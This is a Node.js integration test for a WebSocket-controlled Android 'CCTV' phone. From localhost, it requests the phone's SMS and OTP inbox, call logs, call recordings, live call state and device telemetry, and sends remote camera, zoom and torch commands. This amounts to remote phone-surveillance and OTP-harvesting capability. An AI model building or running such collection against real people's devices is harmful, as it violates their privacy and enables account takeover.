import WebSocket from 'ws';

const WS_URL = 'ws://localhost:8080';
const ROOM_ID = 'cctv-room-1';

console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
console.log('  Live Android Phone & CCTV End-to-End Test Suite');
console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function runLiveTest() {
  const ws = new WebSocket(WS_URL);

  let cameraPeerId = null;
  let receivedHealth = null;
  let receivedSmsHistory = null;
  let receivedCallLogs = null;
  let receivedRecordings = null;
  let receivedOffer = false;

  await new Promise((resolve, reject) => {
    ws.on('open', resolve);
    ws.on('error', reject);
  });

  console.log('✓ Connected to local signaling server at', WS_URL);

  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      const type = msg.type;

      if (type === 'joined') {
        console.log(`✓ Joined room "${ROOM_ID}" as viewer. Peer ID: ${msg.peerId}`);
        const cam = (msg.peers || []).find((p) => p.role === 'camera');
        if (cam) {
          cameraPeerId = cam.peerId;
          console.log(`✓ Found active Camera peer in room: ${cameraPeerId}`);
        }
      }

      if (type === 'peer_joined' && msg.role === 'camera') {
        cameraPeerId = msg.peerId;
        console.log(`✓ Camera peer joined: ${cameraPeerId}`);
      }

      if (type === 'offer') {
        receivedOffer = true;
        console.log(`✓ Received WebRTC Offer from Camera! (SDP length: ${msg.payload?.sdp?.length} chars)`);
      }

      if (type === 'device_health') {
        receivedHealth = msg.payload;
        console.log('\n[FEATURE 1] Live Phone Health & Diagnostics Telemetry:');
        console.log('   • Battery:', receivedHealth.battery?.percentage + '%', `(${receivedHealth.battery?.chargeSource})`, `Temp: ${receivedHealth.battery?.temperatureC}°C`, `Health: ${receivedHealth.battery?.health}`);
        console.log('   • Internal Storage:', receivedHealth.storage?.usedFormatted, 'used /', receivedHealth.storage?.totalFormatted, 'total', `(${receivedHealth.storage?.freeFormatted} free, ${receivedHealth.storage?.usedPercent}% used)`);
        console.log('   • RAM:', receivedHealth.memory?.usedFormatted, 'used /', receivedHealth.memory?.totalFormatted, 'total', `(${receivedHealth.memory?.usedPercent}% used)`);
        console.log('   • Device:', receivedHealth.system?.deviceModel, '|', receivedHealth.system?.androidVersion);
        console.log('   • Uptime:', receivedHealth.system?.uptimeFormatted);
        console.log('   • Phone Clock:', receivedHealth.system?.localTime, receivedHealth.system?.timezone);
        console.log(`   • Top Space-Consuming Apps (${receivedHealth.topApps?.length || 0}):`);
        (receivedHealth.topApps || []).slice(0, 5).forEach((app, i) => {
          console.log(`     #${i + 1} ${app.name} (${app.packageName}): ${app.sizeFormatted}`);
        });
      }

      if (type === 'sms_history') {
        receivedSmsHistory = msg.payload?.messages || [];
        console.log(`\n[FEATURE 2] SIM Messages & OTP Inbox (${receivedSmsHistory.length} messages found):`);
        if (receivedSmsHistory.length === 0) {
          console.log('   (Inbox is empty on this device/SIM)');
        } else {
          receivedSmsHistory.slice(0, 3).forEach((m, i) => {
            console.log(`   [${i + 1}] [${m.type?.toUpperCase()}] Contact: "${m.name || m.address}" | Date: ${m.dateTime}`);
            console.log(`       Message: "${m.body?.substring(0, 70)}..."`);
          });
        }
      }

      if (type === 'call_logs') {
        receivedCallLogs = msg.payload?.logs || [];
        console.log(`\n[FEATURE 3] SIM Call Logs History (${receivedCallLogs.length} logs found):`);
        if (receivedCallLogs.length === 0) {
          console.log('   (Call log is empty on this device/SIM)');
        } else {
          receivedCallLogs.slice(0, 3).forEach((c, i) => {
            console.log(`   [${i + 1}] [${c.type?.toUpperCase()}] Contact: "${c.name || c.number}" | Duration: ${c.durationFormatted} | ${c.dateTime}`);
          });
        }
      }

      if (type === 'call_recordings') {
        receivedRecordings = msg.payload?.recordings || [];
        console.log(`\n[FEATURE 4] Call Recordings (${receivedRecordings.length} recordings found):`);
        receivedRecordings.forEach((r, i) => {
          console.log(`   [${i + 1}] ${r.filename} (${(r.sizeBytes / 1024).toFixed(1)} KB) - ${r.dateTime}`);
        });
      }

      if (type === 'call_state') {
        console.log(`\n[FEATURE 5] Call State Event: state="${msg.payload?.state}", number="${msg.payload?.number}"`);
      }
    } catch (err) {
      console.error('Error parsing message:', err);
    }
  });

  // Step 1: Join room
  ws.send(JSON.stringify({
    type: 'join',
    roomId: ROOM_ID,
    role: 'viewer',
  }));

  await sleep(1500);

  // Step 2: Request Device Health
  console.log('\n--- Querying Feature 1: Device Health & Telemetry ---');
  ws.send(JSON.stringify({
    type: 'get_device_health',
    roomId: ROOM_ID,
    role: 'viewer',
    targetPeerId: cameraPeerId,
  }));

  await sleep(2500);

  // Step 3: Request SMS History
  console.log('\n--- Querying Feature 2: SIM SMS & OTP History ---');
  ws.send(JSON.stringify({
    type: 'get_sms_history',
    roomId: ROOM_ID,
    role: 'viewer',
    targetPeerId: cameraPeerId,
  }));

  await sleep(2000);

  // Step 4: Request Call Logs & Recordings
  console.log('\n--- Querying Feature 3: SIM Call Logs & Recordings ---');
  ws.send(JSON.stringify({
    type: 'get_call_logs',
    roomId: ROOM_ID,
    role: 'viewer',
    targetPeerId: cameraPeerId,
  }));
  ws.send(JSON.stringify({
    type: 'get_recordings',
    roomId: ROOM_ID,
    role: 'viewer',
    targetPeerId: cameraPeerId,
  }));

  await sleep(2000);

  // Step 5: Test Remote Torch Control
  console.log('\n--- Testing Feature 4: Remote Flashlight / Torch Toggle ---');
  console.log('Sending command: toggle_torch (enabled: true)...');
  ws.send(JSON.stringify({
    type: 'command',
    roomId: ROOM_ID,
    role: 'viewer',
    payload: { action: 'toggle_torch', enabled: true },
    targetPeerId: cameraPeerId,
  }));
  await sleep(2000);

  console.log('Sending command: toggle_torch (enabled: false)...');
  ws.send(JSON.stringify({
    type: 'command',
    roomId: ROOM_ID,
    role: 'viewer',
    payload: { action: 'toggle_torch', enabled: false },
    targetPeerId: cameraPeerId,
  }));
  await sleep(1500);

  // Step 6: Test Remote Digital Zoom
  console.log('\n--- Testing Feature 5: Remote Digital Zoom (0.5x -> 1.0x -> 0.0x) ---');
  ws.send(JSON.stringify({
    type: 'command',
    roomId: ROOM_ID,
    role: 'viewer',
    payload: { action: 'set_zoom', zoom: 0.5 },
    targetPeerId: cameraPeerId,
  }));
  await sleep(1000);

  ws.send(JSON.stringify({
    type: 'command',
    roomId: ROOM_ID,
    role: 'viewer',
    payload: { action: 'set_zoom', zoom: 0.0 },
    targetPeerId: cameraPeerId,
  }));
  await sleep(1000);

  // Step 7: Test Remote Lens Switch
  console.log('\n--- Testing Feature 6: Remote Camera Lens Switch ---');
  ws.send(JSON.stringify({
    type: 'command',
    roomId: ROOM_ID,
    role: 'viewer',
    payload: { action: 'switch_camera' },
    targetPeerId: cameraPeerId,
  }));
  await sleep(2500);

  console.log('Switching camera back to rear lens...');
  ws.send(JSON.stringify({
    type: 'command',
    roomId: ROOM_ID,
    role: 'viewer',
    payload: { action: 'switch_camera' },
    targetPeerId: cameraPeerId,
  }));
  await sleep(2500);

  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('  Live Integration Test Run Concluded!');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  ws.close();
}

runLiveTest().catch((err) => {
  console.error('Test error:', err);
  process.exit(1);
});
